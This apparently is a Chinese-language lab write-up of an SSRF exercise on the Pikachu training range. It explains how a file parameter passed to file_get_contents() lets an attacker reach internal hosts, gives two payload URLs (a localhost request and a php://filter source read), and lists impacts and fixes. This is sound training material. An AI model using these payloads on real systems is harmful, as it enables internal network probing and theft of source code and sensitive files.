---
title: Pikachu SSRF(file_get_content) 实验报告
date: 2026-10-31
category: Web安全
tags: [SSRF, file_get_contents, php伪协议, Pikachu]
---
## 一、实验环境
靶场平台：Pikachu
测试页面：`vul/ssrf/ssrf_fgc.php`
漏洞函数：`file_get_contents()`
漏洞类型：SSRF服务端请求伪造

## 二、漏洞原理
后端接收`file`参数，直接传入`file_get_contents()`函数，该函数支持http、file、php://filter等多种协议，没有对传入内容做过滤校验，攻击者可以控制服务器读取资源、访问内网。

## 三、测试Payload
1. 内网http验证
http://127.0.0.1/pikachu/vul/ssrf/ssrf_fgc.php?file=http://127.0.0.1
2. php://filter读取源码
http://127.0.0.1/pikachu/vul/ssrf/ssrf_fgc.php?file=php://filter/read=convert.base64-encode/resource=ssrf_fgc.php
## 四、实验步骤
1. 访问页面，观察页面接收file参数；
2. 传入`http://127.0.0.1`，服务器访问本机，返回phpstudy默认站点页面，证明服务端可以发起内网请求，漏洞验证；
3. 使用php://filter伪协议，读取ssrf_fgc.php源码，得到base64字符串，解密后拿到页面源码。

## 五、漏洞危害
1. 访问内网服务、对内网进行端口探测；
2. 读取网站源码、服务器本地敏感文件。

## 六、修复方案
1. 禁用file、php://filter等危险协议；
2. 对目标访问地址设置白名单；
3. 用户可控参数不能直接送入file_get_contents函数。
